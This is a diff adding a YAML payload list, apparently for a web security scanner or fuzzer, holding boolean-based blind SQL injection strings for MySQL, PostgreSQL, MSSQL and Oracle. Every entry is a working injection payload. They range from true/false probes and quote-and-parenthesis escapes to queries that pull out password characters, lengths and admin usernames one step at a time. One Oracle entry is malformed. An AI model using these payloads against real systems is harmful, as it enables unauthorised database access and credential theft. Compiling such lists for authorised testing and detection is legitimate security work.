@@ -1,0 +1,157 @@
+name: "SQLi Blind Boolean Payloads"
+description: "SQL injection payloads for boolean-based blind injection"
+attack_type: "sqli"
+category: "blind-boolean"
+
+payloads:
+  # Basic boolean tests
+  - value: "' AND '1'='1"
+    description: "Basic true condition"
+    tags: ["boolean", "basic", "true"]
+
+  - value: "' AND '1'='2"
+    description: "Basic false condition"
+    tags: ["boolean", "basic", "false"]
+
+  - value: "' AND 1=1--"
+    description: "Numeric true condition"
+    tags: ["boolean", "numeric", "true"]
+
+  - value: "' AND 1=2--"
+    description: "Numeric false condition"
+    tags: ["boolean", "numeric", "false"]
+
+  - value: "' OR '1'='1"
+    description: "OR true condition"
+    tags: ["boolean", "or", "true"]
+
+  - value: "' OR 1=1--"
+    description: "OR numeric true"
+    tags: ["boolean", "or", "true"]
+
+  # Alternative true conditions
+  - value: "' AND 'x'='x"
+    description: "String compare true"
+    tags: ["boolean", "string", "true"]
+
+  - value: "' AND 1 LIKE 1--"
+    description: "LIKE true condition"
+    tags: ["boolean", "like", "true"]
+
+  - value: "' AND 1<2--"
+    description: "Less than true"
+    tags: ["boolean", "comparison", "true"]
+
+  - value: "' AND 2>1--"
+    description: "Greater than true"
+    tags: ["boolean", "comparison", "true"]
+
+  - value: "' AND 1 BETWEEN 0 AND 2--"
+    description: "BETWEEN true"
+    tags: ["boolean", "between", "true"]
+
+  - value: "' AND 1 IN (1,2,3)--"
+    description: "IN true condition"
+    tags: ["boolean", "in", "true"]
+
+  # Substring extraction (MySQL)
+  - value: "' AND SUBSTRING(@@version,1,1)='5"
+    description: "MySQL version check"
+    tags: ["boolean", "mysql", "substring"]
+
+  - value: "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a"
+    description: "Extract first char"
+    tags: ["boolean", "mysql", "extraction"]
+
+  - value: "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--"
+    description: "ASCII comparison"
+    tags: ["boolean", "mysql", "ascii"]
+
+  - value: "' AND LENGTH((SELECT password FROM users LIMIT 1))>5--"
+    description: "Length check"
+    tags: ["boolean", "mysql", "length"]
+
+  # Substring extraction (PostgreSQL)
+  - value: "' AND SUBSTRING(version(),1,1)='P"
+    description: "PostgreSQL version check"
+    tags: ["boolean", "postgresql", "substring"]
+
+  - value: "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a"
+    description: "PostgreSQL extract char"
+    tags: ["boolean", "postgresql", "extraction"]
+
+  # Substring extraction (MSSQL)
+  - value: "' AND SUBSTRING(@@version,1,1)='M"
+    description: "MSSQL version check"
+    tags: ["boolean", "mssql", "substring"]
+
+  - value: "' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a"
+    description: "MSSQL extract char"
+    tags: ["boolean", "mssql", "extraction"]
+
+  # Substring extraction (Oracle)
+  - value: "' AND SUBSTR(banner,1,1)='O' FROM v$version WHERE ROWNUM=1--"
+    description: "Oracle version check"
+    tags: ["boolean", "oracle", "substr"]
+
+  - value: "' AND (SELECT SUBSTR(username,1,1) FROM users WHERE ROWNUM=1)='a"
+    description: "Oracle extract char"
+    tags: ["boolean", "oracle", "extraction"]
+
+  # EXISTS conditions
+  - value: "' AND EXISTS(SELECT * FROM users)--"
+    description: "Table exists check"
+    tags: ["boolean", "exists"]
+
+  - value: "' AND EXISTS(SELECT * FROM users WHERE username='admin')--"
+    description: "User exists check"
+    tags: ["boolean", "exists", "user"]
+
+  # CASE expressions
+  - value: "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END--"
+    description: "CASE true condition"
+    tags: ["boolean", "case", "true"]
+
+  - value: "' AND CASE WHEN (1=2) THEN 1 ELSE 0 END--"
+    description: "CASE false condition"
+    tags: ["boolean", "case", "false"]
+
+  # Parenthesis variations
+  - value: "') AND '1'='1"
+    description: "Paren close boolean"
+    tags: ["boolean", "parenthesis"]
+
+  - value: "')) AND '1'='1"
+    description: "Double paren boolean"
+    tags: ["boolean", "parenthesis"]
+
+  - value: "1) AND 1=1--"
+    description: "Numeric paren boolean"
+    tags: ["boolean", "parenthesis", "numeric"]
+
+  # Null checks
+  - value: "' AND NULL IS NULL--"
+    description: "NULL true condition"
+    tags: ["boolean", "null", "true"]
+
+  - value: "' AND 1 IS NOT NULL--"
+    description: "NOT NULL true"
+    tags: ["boolean", "null", "true"]
+
+  # Integer context
+  - value: "1 AND 1=1"
+    description: "Integer AND true"
+    tags: ["boolean", "integer", "true"]
+
+  - value: "1 AND 1=2"
+    description: "Integer AND false"
+    tags: ["boolean", "integer", "false"]
+
+  # Count-based
+  - value: "' AND (SELECT COUNT(*) FROM users)>0--"
+    description: "Count greater than"
+    tags: ["boolean", "count"]
+
+  - value: "' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--"
+    description: "Exact count check"
+    tags: ["boolean", "count"]
